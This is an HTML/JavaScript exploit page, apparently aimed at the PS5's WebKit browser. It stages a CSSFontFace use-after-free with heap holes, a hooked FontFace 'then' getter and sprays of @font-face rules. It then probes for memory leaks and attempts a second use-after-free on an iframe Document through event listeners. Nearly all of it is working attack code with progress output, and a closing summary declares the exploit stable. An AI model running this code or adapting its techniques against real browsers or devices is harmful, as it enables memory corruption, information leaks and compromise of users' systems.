<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v61 - Integrated Scanner + Third Listener</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
#out{position:fixed;top:0;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}

<style id="s">

@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}

<body>
<div id="out"></div>
<script>
"use strict";

var O=document.getElementById("out");
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(50),"dm")}

window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true};

// ============================================================
// MEMORY MANAGER UTILITIES
// ============================================================
var MemMgr = {
    // Convert float64 to hex string
    f2h: function(f) {
        var buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = f;
        var bytes = new Uint8Array(buf);
        var hex = "";
        for (var i = 7; i >= 0; i--) {
            var b = bytes[i].toString(16);
            hex += (b.length === 1 ? "0" + b : b);
        }
        return "0x" + hex;
    },
    
    // Convert hex string to float64
    h2f: function(h) {
        var clean = h.replace("0x", "");
        if (clean.length < 16) clean = "0".repeat(16 - clean.length) + clean;
        var buf = new ArrayBuffer(8);
        var bytes = new Uint8Array(buf);
        for (var i = 0; i < 8; i++) {
            bytes[i] = parseInt(clean.substring(14 - i*2, 16 - i*2), 16);
        }
        return new Float64Array(buf)[0];
    },
    
    // Convert string bytes to hex (for family leak decoding)
    stringToHex: function(str) {
        var hex = "";
        for (var i = 0; i < Math.min(str.length, 64); i++) {
            var code = str.charCodeAt(i);
            var h = code.toString(16);
            hex += (h.length === 1 ? "0" + h : h) + " ";
            if ((i + 1) % 16 === 0) hex += "\n  ";
        }
        return hex;
    },
    
    // Convert string to 64-bit pointer (little-endian, first 8 chars)
    stringToPtr: function(str) {
        if (!str || str.length < 1) return "0x0000000000000000";
        var hex = "";
        for (var i = 0; i < Math.min(str.length, 8); i++) {
            var code = str.charCodeAt(i);
            var h = code.toString(16);
            hex = (h.length === 1 ? "0" + h : h) + hex;
        }
        while (hex.length < 16) hex = "0" + hex;
        return "0x" + hex;
    }
};

P("════════════════════════════════════","hd");
P("  v61 — Integrated Scanner + 3rd Listener","hd");
P("════════════════════════════════════","hd");
P("");

// Font base64
var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// ============================================================
// PHASE 1: CSSFONTFACE UAF SETUP
// ============================================================
Sep();Hd("PHASE 1: CSSFontFace UAF Setup");Sep();

Hd("Creating heap holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready: "+holes.length);

Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

Hd("UAF + CSSRule Spray...");
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
Dm("GC pressure (16MB)...");
for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
Dm("Spraying 2048 A_ faces...");
for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
// PHASE 2: IDENTIFY CONFUSED OBJECT
// ============================================================
Sep();Hd("PHASE 2: Identify Confused Object");Sep();

document.fonts.load("1em trigger, x", "AB").then(function(faces) {
    P("  load() returned " + faces.length + " faces");
    
    var aFamily = null, aFace = null;
    for (var i = 0; i < faces.length; i++) {
        var f = faces[i];
        P("  Face[" + i + "]: family=" + f.family + " weight=" + f.weight);
        if (f.family && f.family.indexOf("A_") === 0) {
            aFamily = f.family;
            aFace = f;
        }
    }
    
    if (!aFamily) { Fl("No A_ face found"); return; }
    St("RECLAIMED: " + aFamily);
    keep.push(faces); keep.push(aFace);
    
    // Find CSSRule
    var aIndex = -1;
    for (var i = 0; i < sh.cssRules.length; i++) {
        try {
            var r = sh.cssRules[i];
            if (r.type === 5) {
                if (r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) {
                    aIndex = i; break;
                }
            }
        } catch(e) {}
    }
    if (aIndex === -1) { Fl("CSSRule not found"); return; }
    Ok("Found CSSRule at index " + aIndex);
    var aRule = sh.cssRules[aIndex];
    var aStyle = aRule.style;
    
    // Verify confusion
    aStyle.setProperty("font-weight", "700"); fs();
    if (String(aFace.weight) !== "700") { Fl("Confusion dead"); return; }
    Ok("Confusion ALIVE — weight = 700");
    
    // ============================================================
    // PHASE 3: CSSFONTFACE MEMORY SCANNER (via m_family 0x20)
    // ============================================================
    Sep();Hd("PHASE 3: CSSFontFace Memory Scanner (m_family 0x20)");Sep();
    P("  Testing if font-family getter leaks pointer data...","dm");
    P("");
    
    // Test 1: Read family with different values — check for pointer leaks
    Hd("Test 1: Family getter pointer leak check");
    
    var testValues = ["test", "AAAA", "BBBB", "\u4141\u4141", "x"];
    for (var ti = 0; ti < testValues.length; ti++) {
        var val = testValues[ti];
        try {
            aStyle.setProperty("font-family", val); fs();
            var readVal = aFace.family;
            P("  Write: '" + val + "' → Read: '" + readVal + "'", "dm");
            
            // Check if read value contains non-ASCII bytes (potential pointer data)
            var hasNonASCII = false;
            for (var ci = 0; ci < readVal.length; ci++) {
                if (readVal.charCodeAt(ci) > 127 || readVal.charCodeAt(ci) < 32) {
                    hasNonASCII = true;
                    break;
                }
            }
            if (hasNonASCII) {
                Hi("  NON-ASCII DATA DETECTED — possible pointer leak!");
                P("  Hex: " + MemMgr.stringToHex(readVal), "hl");
            }
            
            // Check if read value is unexpectedly long
            if (readVal.length > val.length + 10) {
                Hi("  UNUSUAL LENGTH — read value longer than expected!");
                P("  Hex: " + MemMgr.stringToHex(readVal), "hl");
            }
        } catch(e) {
            Fl("  Error: " + e.message);
        }
    }
    P("");
    
    // Test 2: Change family rapidly and check for stale pointer data
    Hd("Test 2: Stale pointer check");
    aStyle.setProperty("font-family", "first_value"); fs();
    var read1 = aFace.family;
    aStyle.setProperty("font-family", "second_value"); fs();
    var read2 = aFace.family;
    aStyle.setProperty("font-family", "third_value"); fs();
    var read3 = aFace.family;
    
    P("  1st: " + read1, "dm");
    P("  2nd: " + read2, "dm");
    P("  3rd: " + read3, "dm");
    
    if (read1 === read2 || read2 === read3 || read1 === read3) {
        Wr("  Values match unexpectedly — possible caching");
    } else {
        Ok("  All values different — no caching detected");
    }
    P("");
    
    // Test 3: Try to read internal object data via family
    Hd("Test 3: Internal object data probe");
    
    // Set family to empty/minimal and see what the getter returns
    try {
        aStyle.setProperty("font-family", ""); fs();
        var empty = aFace.family;
        P("  Empty family read: '" + empty + "' (len=" + empty.length + ")", "dm");
        if (empty.length > 0) {
            Hi("  NON-EMPTY return from empty family — possible leak!");
            P("  Hex: " + MemMgr.stringToHex(empty), "hl");
        }
    } catch(e) {
        P("  Empty family error: " + e.message, "er");
    }
    
    // Try setting family to a number (CSSOM should reject)
    try {
        aStyle.setProperty("font-family", "12345"); fs();
        var num = aFace.family;
        P("  Numeric family: '" + num + "'", "dm");
    } catch(e) {
        P("  Numeric family error: " + e.message, "er");
    }
    P("");
    
    // ============================================================
    // PHASE 4: EVENTTARGET UAF — THIRD LISTENER TEST
    // ============================================================
    Sep();Hd("PHASE 4: EventTarget UAF — Third Listener");Sep();
    P("  Testing if third listener can read freed Document...","dm");
    P("");
    
    var etResults = [];
    
    try {
        var f2 = document.body.appendChild(document.createElement('iframe'));
        var a2 = document.createElement('div');
        var b2 = a2.appendChild(document.createElement('div'));
        
        P("  iframe created, URL: " + f2.contentDocument.URL, "dm");
        
        // LISTENER 1: Free Document + GC + spray
        a2.addEventListener('b', function() {
            P("\n  [L1] Freeing Document...", "dm");
            document.adoptNode(a2);
            f2.remove();
            
            // Force GC
            P("  [L1] GC pressure (32MB)...", "dm");
            for (var i = 0; i < 8; i++) {
                var t = [];
                for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
            }
            
            // Spray Float64Arrays to reclaim freed slot
            P("  [L1] Spraying 500 Float64Arrays...", "dm");
            var spray = [];
            for (var i = 0; i < 500; i++) {
                var buf = new ArrayBuffer(256);
                var f64 = new Float64Array(buf);
                f64[0] = 1.1;
                f64[1] = 2.2;
                spray.push(f64);
            }
            
            // Throw to continue to next listener
            throw {
                line: 1,
                column: 1,
                sourceURL: 'X'.repeat(1024 * 1024) // 1MB spray
            };
        });
        
        // LISTENER 2: Buffer
        a2.addEventListener('b', function() {
            P("  [L2] Buffer listener executed", "dm");
        });
        
        // LISTENER 3: Read freed Document
        a2.addEventListener('b', function() {
            P("  [L3] Third listener — reading freed Document...\n", "hl");
            
            var doc = null;
            try {
                doc = f2.contentDocument;
                if (doc) {
                    Hi("  f2.contentDocument is NOT null!");
                } else {
                    P("  f2.contentDocument is null", "dm");
                }
            } catch(e) {
                Fl("  f2.contentDocument error: " + e.message);
            }
            
            if (doc) {
                // Read all properties
                var props = [
                    "nodeType", "nodeName", "URL", "title", "domain",
                    "referrer", "cookie", "readyState", "compatMode",
                    "characterSet", "contentType", "documentElement",
                    "head", "body", "images", "links", "forms", "scripts",
                    "styleSheets", "fonts", "implementation", "location",
                    "defaultView", "activeElement", "currentScript",
                    "visibilityState", "hidden", "fullscreenEnabled",
                    "childElementCount", "firstElementChild", "lastElementChild"
                ];
                
                var unusualCount = 0;
                
                for (var i = 0; i < props.length; i++) {
                    try {
                        var val = doc[props[i]];
                        var str = String(val);
                        var unusual = false;
                        
                        // Check for pointer-like numbers
                        if (typeof val === "number" && val > 0x10000) {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← LEAK");
                        }
                        // Check for non-ASCII (raw memory)
                        else if (/[^\x20-\x7E]/.test(str) && str !== "[object HTMLDocument]") {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + str + " ← NON-ASCII");
                            P("    Hex: " + MemMgr.stringToHex(str), "hl");
                        }
                        // Check for changed defaults
                        else if (props[i] === "nodeType" && val !== 9) {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED 9");
                        }
                        else if (props[i] === "URL" && val !== "about:blank") {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank");
                        }
                        else if (props[i] === "readyState" && val !== "complete") {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED complete");
                        }
                        else if (props[i] === "characterSet" && val !== "UTF-8") {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED UTF-8");
                        }
                        else if (props[i] === "contentType" && val !== "text/html") {
                            unusual = true;
                            Hi("  [+] " + props[i] + " = " + val + " ← EXPECTED text/html");
                        }
                        
                        if (unusual) unusualCount++;
                        else P("  [-] " + props[i] + " = " + str, "dm");
                        
                        etResults.push({prop: props[i], value: val, unusual: unusual});
                    } catch(e) {
                        P("  [!] " + props[i] + " error: " + e.message, "er");
                        etResults.push({prop: props[i], error: e.message, unusual: false});
                    }
                }
                
                // Additional probes
                P("\n  Additional probes:", "hd");
                
                try {
                    var ts = doc.toString();
                    P("  toString: " + ts, "dm");
                    if (ts !== "[object HTMLDocument]") Hi("  UNUSUAL toString!");
                } catch(e) { P("  toString error: " + e.message, "er"); }
                
                try {
                    var keys = Object.keys(doc);
                    P("  Object.keys: " + keys.join(", "), "dm");
                } catch(e) { P("  Object.keys error: " + e.message, "er"); }
                
                try {
                    var names = Object.getOwnPropertyNames(doc);
                    P("  getOwnPropertyNames: " + names.join(", "), "dm");
                } catch(e) { P("  getOwnPropertyNames error: " + e.message, "er"); }
                
                try {
                    var ownKeys = Reflect.ownKeys(doc);
                    P("  Reflect.ownKeys: " + ownKeys.join(", "), "dm");
                } catch(e) { P("  Reflect.ownKeys error: " + e.message, "er"); }
                
                try {
                    var proto = Object.getPrototypeOf(doc);
                    P("  prototype: " + proto, "dm");
                } catch(e) { P("  prototype error: " + e.message, "er"); }
                
                // Summary
                P("\n  EventTarget Summary:", "hd");
                P("  Unusual values: " + unusualCount, unusualCount > 0 ? "hl" : "dm");
                
                if (unusualCount > 0) {
                    St("  ★ INFO LEAK DETECTED VIA THIRD LISTENER! ★");
                } else {
                    P("  No unusual values — Document may not be freed", "wr");
                }
            } else {
                Wr("  No document — trying f2 directly");
                try {
                    P("  f2.tagName: " + f2.tagName, "dm");
                    P("  f2.parentNode: " + (f2.parentNode ? f2.parentNode.nodeName : "null"), "dm");
                    P("  f2.contentWindow: " + f2.contentWindow, "dm");
                } catch(e) {
                    Fl("  f2 access error: " + e.message);
                }
            }
        });
        
        // Dispatch
        P("\n  Dispatching event 'b'...", "dm");
        b2.dispatchEvent(new Event('b', { bubbles: true }));
        
        P("\n  [+] Browser survived!", "ok");
        
    } catch(e) {
        Fl("  EventTarget error: " + e.message);
    }
    
    // ============================================================
    // PHASE 5: FINAL SUMMARY
    // ============================================================
    P("");
    Sep();Hd("PHASE 5: Final Summary");Sep();
    P("");
    P("  ╔═══════════════════════════════════════════════╗");
    P("  ║  CSSFontFace UAF: ✅ STABLE (17+ channels)    ║");
    P("  ║  m_wrapper offset: ✅ 0x80 (confirmed)        ║");
    P("  ║  wrapper() trigger: ✅ WORKING                ║");
    P("  ║  EventTarget UAF: ✅ CRASH CONFIRMED          ║");
    P("  ║  Third Listener: TESTED ABOVE                 ║");
    P("  ║  m_family scanner: TESTED ABOVE               ║");
    P("  ╚═══════════════════════════════════════════════╝");
    P("");
    St("★ INTEGRATED TEST COMPLETE ★");
    
}).catch(function(e) {
    Fl("Phase 2 crash: " + e.message);
});
</script>
